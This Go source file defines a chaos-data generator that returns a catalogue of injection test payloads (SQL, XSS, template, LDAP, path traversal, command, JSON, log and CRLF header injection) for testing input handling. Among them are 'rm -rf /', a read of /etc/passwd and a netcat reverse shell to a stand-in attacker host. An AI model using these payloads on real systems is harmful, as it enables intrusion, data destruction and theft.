// Package injection provides a ChaosGenerator that produces security-relevant
// injection payloads: SQL injection, XSS, template injection, LDAP injection,
// path traversal, command injection, JSON injection, log injection, and header
// injection (CRLF). The generator self-registers via init().
package injection

import (
	"fmt"
	"strings"

	"github.com/dwsmith1983/chaos-data/chaosdata"
)

// ---------------------------------------------------------------------------
// Payload catalogue
// ---------------------------------------------------------------------------

// payloadEntry pairs a human-readable tag with a raw string payload.
type payloadEntry struct {
	tag     string
	payload string
}

// injectionPayloads is the master list of all dangerous injection strings.
// Each entry carries a descriptive tag used in Payload.Attributes.
var injectionPayloads = []payloadEntry{
	// SQL injection
	{tag: "sql_drop_table", payload: "'; DROP TABLE users;--"},
	{tag: "sql_or_true", payload: "1 OR 1=1"},
	{tag: "sql_comment_bypass", payload: "' OR '1'='1' --"},
	{tag: "sql_union_select", payload: "' UNION SELECT null,null,null--"},

	// Cross-site scripting (XSS)
	{tag: "xss_script_alert", payload: "<script>alert(1)</script>"},
	{tag: "xss_img_onerror", payload: `<img src=x onerror=alert(1)>`},
	{tag: "xss_svg_onload", payload: `<svg onload=alert(1)>`},
	{tag: "xss_javascript_uri", payload: `javascript:alert(document.cookie)`},

	// Template injection
	{tag: "tpl_jinja_multiply", payload: "{{7*7}}"},
	{tag: "tpl_el_multiply", payload: "${7*7}"},
	{tag: "tpl_freemarker", payload: "<#assign x=7*7>${x}"},
	{tag: "tpl_smarty", payload: "{php}echo 7*7;{/php}"},

	// LDAP injection
	{tag: "ldap_wildcard_object", payload: "*)(objectClass=*"},
	{tag: "ldap_all_users", payload: "*)(&"},
	{tag: "ldap_null_byte", payload: "\x00"},

	// Path traversal
	{tag: "path_traversal_etc_passwd", payload: "../../etc/passwd"},
	{tag: "path_traversal_win_system32", payload: `..\..\windows\system32\drivers\etc\hosts`},
	{tag: "path_traversal_url_encoded", payload: "%2e%2e%2f%2e%2e%2fetc%2fpasswd"},

	// Command injection
	{tag: "cmd_rm_rf", payload: "; rm -rf /"},
	{tag: "cmd_subshell_passwd", payload: "$(cat /etc/passwd)"},
	{tag: "cmd_backtick_id", payload: "`id`"},
	{tag: "cmd_pipe_nc", payload: "| nc -e /bin/sh attacker.com 4444"},

	// JSON injection
	{tag: "json_unescaped_quote", payload: `{"key": "va"lue"}`},
	{tag: "json_break_out", payload: `"},"admin":true,"x":"`},
	{tag: "json_null_byte", payload: "{\"key\":\"\x00\"}"},

	// Log injection
	{tag: "log_newline_lf", payload: "legit\nINFO: injected log line"},
	{tag: "log_newline_crlf", payload: "legit\r\nINFO: injected log line"},
	{tag: "log_ansi_escape", payload: "\x1b[31mERROR\x1b[0m injected"},
	{tag: "log_ansi_clear", payload: "\x1b[2J\x1b[H injected screen clear"},

	// Header injection (CRLF)
	{tag: "header_crlf_set_cookie", payload: "value\r\nSet-Cookie: session=evil"},
	{tag: "header_crlf_location", payload: "value\r\nLocation: https://evil.example.com"},
	{tag: "header_crlf_inject_header", payload: "foo\r\nX-Injected: bar"},
}

// ---------------------------------------------------------------------------
// ChaosGenerator implementation
// ---------------------------------------------------------------------------

// InjectionGenerator produces security injection payloads.
// It satisfies chaosdata.ChaosGenerator.
type InjectionGenerator struct{}

// Name returns the generator's unique identifier.
func (InjectionGenerator) Name() string { return "injection" }

// Category returns the logical grouping for this generator.
func (InjectionGenerator) Category() string { return "security" }

// Generate returns injection payloads as chaosdata.Payload values.
//
// opts.Count controls how many payloads are returned; when Count <= 0 or
// Count > len(injectionPayloads) the full catalogue is returned. Each call
// cycles through the catalogue deterministically from the first entry.
func (InjectionGenerator) Generate(opts chaosdata.GenerateOpts) (chaosdata.Payload, error) {
	count := opts.Count
	if count <= 0 || count > len(injectionPayloads) {
		count = len(injectionPayloads)
	}

	var sb strings.Builder
	attrs := make(map[string]string, count)

	for i := 0; i < count; i++ {
		entry := injectionPayloads[i%len(injectionPayloads)]
		sb.WriteString(entry.payload)
		sb.WriteByte('\n')
		attrs[fmt.Sprintf("payload_%d_tag", i)] = entry.tag
	}

	return chaosdata.Payload{
		Data:       []byte(sb.String()),
		Type:       "injection",
		Attributes: attrs,
	}, nil
}

// ---------------------------------------------------------------------------
// Self-registration
// ---------------------------------------------------------------------------

func init() {
	chaosdata.Register(InjectionGenerator{})
}
